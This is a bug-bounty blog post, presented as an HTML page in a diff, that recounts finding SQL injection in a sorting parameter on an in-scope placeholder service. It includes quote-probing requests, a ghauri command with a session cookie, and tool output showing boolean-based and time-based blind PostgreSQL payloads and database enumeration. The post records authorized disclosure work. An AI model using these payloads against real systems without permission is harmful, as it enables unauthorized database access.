@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html 
+  lang="en" 
+  dir="ltr">
+
+<head>
+  <link rel="icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  
+  
+  <meta name="description" content="|_337 |-|4&gt;&lt;0R?" />
+  
+  
+
+  <title>
+    
+    How I Got My First €€€€ Bounty
+    
+</title>
+  <link rel="alternate" type="application/atom+xml" title="Machiavelli&#x27;s Homepage Atom Feed" href="https://machiavelli.me/atom.xml" />
+
+  
+  <link rel="stylesheet" href="https://machiavelli.me/site.css">
+  
+
+  
+  
+</head>
+
+<body class="hack dark main container">
+  
+    
+        
+  
+  <header class="nav-header">
+    <nav itemscope itemtype="http://schema.org/SiteNavigationElement" class="navbar">
+      <div class="nav-links">
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me">
+          <span itemprop="name">Home</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/rquotes">
+          <span itemprop="name">rquotes</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/lolbas">
+          <span itemprop="name">lolbas</span></a>
+        
+      </div>
+    </nav>
+    
+    <div class="search-container">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" class="search-icon">
+        <path stroke-linecap="round" stroke-linejoin="round"
+          d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z" />
+      </svg>
+      <input type="text" id="search" placeholder="Search...">
+      <div class="search-results">
+        <div class="search-results__items"></div>
+      </div>
+    </div>
+    
+
+  </header>
+  
+  
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">How I Got My First €€€€ Bounty</h1>
+        <span class="muted">
+    <svg class="icon i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>2 minute read</span>
+    <svg class="icon i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2024-06-03
+</span>
+    </header>
+        
+        <nav aria-label="Table of contents">
+        <details>
+            <summary role="button" style="padding: 0rem 0rem 0rem 0rem;margin: 1rem 0rem 1.5rem 0rem;">
+            Table of Contents
+            <br>
+            </summary>
+            <ul>
+            
+                <li>
+                <a href="https://machiavelli.me/how-i-got-my-first-eureureureur-bounty/#disclaimer">Disclaimer</a>
+                
+                    <ul>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/how-i-got-my-first-eureureureur-bounty/#salmun">سَلامٌ</a>
+                        
+                        </li>
+                    
+                        <li>
+                        <a href="https://machiavelli.me/how-i-got-my-first-eureureureur-bounty/#salmun-1">سَلامٌ</a>
+                        
+                        </li>
+                    
+                    </ul>
+                
+                </li>
+            
+            </ul>
+        </details>
+        </nav>
+
+
+    <div itemprop="articleBody">
+      <p>I'll share in this write-up how I discovered my first €€€€ bounty.</p>
+<span id="continue-reading"></span><h2 id="disclaimer">Disclaimer</h2>
+<p><strong>This isn’t meant to teach anything new—just sharing a personal experience.</strong></p>
+<h3 id="salmun">سَلامٌ</h3>
+<p>At first, I started with basic manual recon because the program's scope was just a set of URLs related to different services, such as:</p>
+<ul>
+<li><code>https://ex.admin.service.example.com/</code></li>
+<li><code>https://ex.service.service.example.com/</code></li>
+<li><code>https://ex.abc.service.example.com/</code></li>
+</ul>
+<p>The program also provided credentials to test different roles.</p>
+<p>I then browsed the sites while proxying the traffic through Burp and testing the functionalities like a normal user. However, there weren’t any interesting features—except for the sorting functionality. I noticed some intriguing parameters that I had already seen in some <em>JS</em> files:</p>
+<p><code>SelectedSources</code> and <code>SelectedTemplateNames</code>.</p>
+<p>At first, I thought they might fetch data from a database (yeah that makes sense :D), so I decided to test them with special characters, searching for anomalies like <code>{", ', \}</code>. When I entered a single quote, I got a <code>500 HTTP status code (Internal Server Error)</code>. Adding another single quote returned a <code>200 HTTP status code (OK)</code>.</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">https://ex.service.example.com/history?selectedSources=someSources&#39; &gt; 500
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">https://ex.service.example.com/history?selectedSources=someSources&#39;&#39; &gt; 200
+</span></code></pre>
+<p>Sometimes, I use a backslash to confirm my suspicions. In this case, I got a <code>400 Bad Request</code> (since it was a Java app running on Apache Tomcat, the backslash needed to be encoded as <code>%5c</code>).</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">https://ex.service.example.com/history?selectedSources=someSources\&#39; &gt; 400
+</span></code></pre>
+<p>After that, I tried running <code>sqlmap</code> to extract the database version. Unfortunately, <code>sqlmap</code> didn’t retrieve anything except that the DBMS was <code>PostgreSQL</code>. However, I didn’t give up—I switched to <code>ghauri</code> instead:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">ghauri -u </span><span style="color:#9acc76;">&quot;https://ex.service.example.com/history?selectedSources=someSources&quot;</span><span style="color:#eb6772;"> --dbms</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">postgres</span><span style="color:#eb6772;"> --cookie</span><span style="color:#adb7c9;">=</span><span style="color:#9acc76;">&quot;JSESSIONID=09326D266052B6B0F7E391B7BBD3A284&quot;</span><span style="color:#eb6772;"> --dbs
+</span></code></pre>
+<p><strong>Boom!</strong></p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">[09:22:32] </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">INFO</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;"> testing connection to the target URL
+</span><span style="color:#eb6772;">Ghauri</span><span style="color:#abb2bf;"> resumed the following injection point(s) </span><span style="color:#eb6772;">from</span><span style="color:#abb2bf;"> stored session:                                                                                                                                                                                                                                          
+</span><span style="color:#eb6772;">Parameter:</span><span style="color:#abb2bf;"> selectedSources (GET)                                                                                                                                                                                                             
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">Type:</span><span style="color:#abb2bf;"> boolean-based blind                                                                                                                                                                                                               
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">Title:</span><span style="color:#abb2bf;"> OR boolean-based blind - WHERE or HAVING clause                                                                                                                                                                                  
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">Payload:</span><span style="color:#abb2bf;"> selectedSources=someSources</span><span style="color:#9acc76;">&#39;) OR 06690=6690 OR (&#39;</span><span style="color:#abb2bf;">04586</span><span style="color:#9acc76;">&#39;=&#39;</span><span style="color:#abb2bf;">4586                                                                                                                                                                       
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">Type:</span><span style="color:#abb2bf;"> time-based blind                                                                                                                                                                                                                   
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">Title:</span><span style="color:#abb2bf;"> PostgreSQL </span><span style="color:#adb7c9;">&gt; </span><span style="color:#db9d63;">8</span><span style="color:#abb2bf;">.1 AND time-based blind (comment)                                                                                                                                                                                  
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">Payload:</span><span style="color:#abb2bf;"> selectedSources=someSources</span><span style="color:#9acc76;">&#39;) AND 4564=(SELECT 4564 FROM PG_SLEEP(6)) OR (&#39;</span><span style="color:#abb2bf;">04586</span><span style="color:#9acc76;">&#39;=&#39;</span><span style="color:#abb2bf;">4586                                                                                                                                                                                                                                                                                                                                                                              
+</span><span style="color:#eb6772;">[09:22:33] </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">INFO</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;"> testing PostgreSQL
+</span><span style="color:#eb6772;">[09:22:34] </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">INFO</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;"> confirming PostgreSQL
+</span><span style="color:#eb6772;">[09:22:34] </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">INFO</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;"> the back-end DBMS is PostgreSQL
+</span><span style="color:#eb6772;">[09:22:34] </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">INFO</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;"> fetching database names
+</span><span style="color:#eb6772;">[09:22:34] </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">INFO</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;"> fetching number of databases
+</span><span style="color:#eb6772;">[09:22:51] </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">INFO</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;"> retrieved: 3
+</span><span style="color:#eb6772;">[09:26:01] </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">INFO</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;"> retrieved: information_schema
+</span><span style="color:#eb6772;">[09:27:51] </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">INFO</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;"> retrieved: pg_catalog
+</span><span style="color:#eb6772;">[09:28:57] </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">INFO</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;"> retrieved: public
+</span><span style="color:#eb6772;">available</span><span style="color:#abb2bf;"> databases </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">3</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;">:
+</span><span style="color:#eb6772;">[*]</span><span style="color:#abb2bf;"> pg_catalog
+</span><span style="color:#eb6772;">[*]</span><span style="color:#abb2bf;"> public
+</span><span style="color:#eb6772;">[*]</span><span style="color:#abb2bf;"> information_schema
+</span></code></pre>
+<p>I reported the vulnerability, and within just one hour, the triager forwarded my report to the company. They quickly acknowledged the issue.</p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;how-i-got-my-first-eureureureur-bounty&#x2F;assets/images/main.webp" 
+      alt="main" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>The next day, the company awarded me a bounty.</p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;how-i-got-my-first-eureureureur-bounty&#x2F;assets/images/accepted.webp" 
+      alt="accepted" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p><strong>Final Thoughts</strong></p>
+<p>Don’t limit yourself to just one tool, technique, or program you don’t fully understand—it will only burn you out. The internet is already full of vulnerabilities waiting to be discovered.</p>
+<p>Twitter/X: <a href="https://x.com/MachIaVellill">https://x.com/MachIaVellill</a></p>
+<h3 id="salmun-1">سَلامٌ</h3>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by Machiavelli
+                
+                
+                    
+                    in <a href="https://machiavelli.me/categories/bug-bounty/">Bug Bounty</a>
+                
+                
+                    and
+                    tagged
+                    
+                        <a href="https://machiavelli.me/tags/bug-bounty/">Bug Bounty</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/infosec/">Infosec</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/sql-injection/">SQL Injection</a>
+                        
+                            
+                                
+                                    and
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/sqlmap/">sqlmap</a>
+                        
+                            
+                        
+                    
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+
+  <!-- optional scripts -->
+  
+  
+  <script src="https://machiavelli.me/js/codeblock.js"></script>
+  
+
+  
+<!-- MathJax script for rendering LaTeX math equations -->
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"],
+      ],
+      displayMath: [
+        ["$$", "$$"],
+        ["\\[", "\\]"],
+      ],
+    },
+  };
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js" async></script>
+
+
+  
+<script type="text/javascript" src="https://machiavelli.me/elasticlunr.min.js"></script>
+<script type="text/javascript" src="https://machiavelli.me/js/search.js"></script>
+
+
+  
+</body>
+
+</html>
